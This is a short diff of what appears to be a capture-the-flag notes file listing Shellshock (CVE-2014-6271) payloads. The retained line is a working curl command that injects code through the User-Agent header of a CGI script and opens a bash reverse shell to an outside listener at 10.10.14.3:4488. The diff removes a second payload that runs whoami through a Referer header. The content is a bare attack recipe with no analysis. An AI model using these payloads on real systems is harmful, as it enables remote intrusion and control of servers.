@@ -1,6 +1,4 @@
 Standard payload
 curl -H ‘User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.3/4488 0>&1’ http://10.10.10.56:80/cgi-bin/user.sh
 
-Alternate version of Shellshock payload:
-curl http://IP/cgi-bin/test.cgi -A "Referer:() { :;}; echo \"NS:\" $(whoami)"
-https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/
+
